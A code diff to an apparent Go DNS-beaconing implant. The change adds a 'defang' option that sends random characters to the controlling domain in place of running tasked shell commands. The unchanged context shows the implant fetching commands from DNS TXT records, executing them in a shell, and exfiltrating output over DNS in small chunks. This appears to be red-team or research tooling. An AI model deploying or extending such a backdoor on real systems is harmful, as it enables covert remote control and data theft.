@@ -20,6 +20,7 @@ import (
 	"os"
 	"os/exec"
 	"runtime"
+	"strconv"
 	"strings"
 	"time"
 )
@@ -30,6 +31,11 @@ const (
 
 	// RIDLEN is the length of the random ID
 	RIDLEN = 4
+
+	// DEFANGALPHABET
+	DEFANGALPHABET = "abcdefghijklmnopqrstuvwxyz" +
+		"ABCDEFGHIJKLMNOPQRSTUVWXYZ" +
+		"0123456789 \n"
 )
 
 // COUNTER is used to prevent caching
@@ -77,6 +83,12 @@ func main() {
 			rand.Uint64(),
 			"Start cache-busting counter at `N`",
 		)
+		defang = flag.Bool(
+			"defang",
+			false,
+			"Don't actually run commands, send back random "+
+				"characters",
+		)
 	)
 	flag.Usage = func() {
 		fmt.Fprintf(
@@ -117,7 +129,7 @@ Options:
 		/* If we have it, do it and send the output back, don't sleep
 		so long next time */
 		if "" != tasking {
-			doTasking(tasking, *id, *domain, *cTimeout)
+			doTasking(tasking, *id, *domain, *cTimeout, *defang)
 			st = *bMin
 		}
 		/* Sleep before next beacon */
@@ -220,8 +232,15 @@ func getTasking(id, domain string) string {
 	return txts[0]
 }
 
-/* doTasking runs the tasking in a shell and returns the output over DNS */
-func doTasking(task, id, domain string, to time.Duration) {
+/* doTasking runs the tasking in a shell and returns the output over DNS.  If
+defang is true and task is a number, that many random characters will be sent
+instead of running a command. */
+func doTasking(task, id, domain string, to time.Duration, defang bool) {
+	if defang {
+		sendRandomChars(task, id, domain)
+		return
+	}
+
 	/* Context which times out */
 	ctx, cancel := context.WithTimeout(context.Background(), to)
 	defer cancel() /* Shouldn't do much, but may clean things up */
@@ -263,6 +282,11 @@ func doTasking(task, id, domain string, to time.Duration) {
 	}
 
 	/* Send it back in 31-byte chunks */
+	sendBytes(o, id, domain)
+}
+
+/* sendBytes sends off the contents of b */
+func sendBytes(o []byte, id, domain string) {
 	var (
 		start int
 		end   int
@@ -289,6 +313,32 @@ func doTasking(task, id, domain string, to time.Duration) {
 			log.Printf("Error (%v): %v", n, err)
 		}
 	}
+}
+
+/* sendRandomChars sends random characters to the server.  The number of
+characters is controlled by putting a number in count. */
+func sendRandomChars(count, id, domain string) {
+	/* Try to get a number */
+	n, err := strconv.Atoi(count)
+	if nil != err {
+		s := err.Error()
+		if !strings.HasSuffix(s, "\n") {
+			s += "\n"
+		}
+		sendBytes([]byte(s), id, domain)
+		return
+	}
+
+	/* Characters to send */
+	cs := make([]byte, n)
+	for i := range cs {
+		cs[i] = []byte(DEFANGALPHABET)[rand.Intn(len(DEFANGALPHABET))]
+	}
+	if !bytes.HasSuffix(cs, []byte{'\n'}) {
+		cs = append(cs, '\n')
+	}
+
+	sendBytes(cs, id, domain)
 }
 
 /* addJitter returns d varied by j, which must be a fraction between 0 and
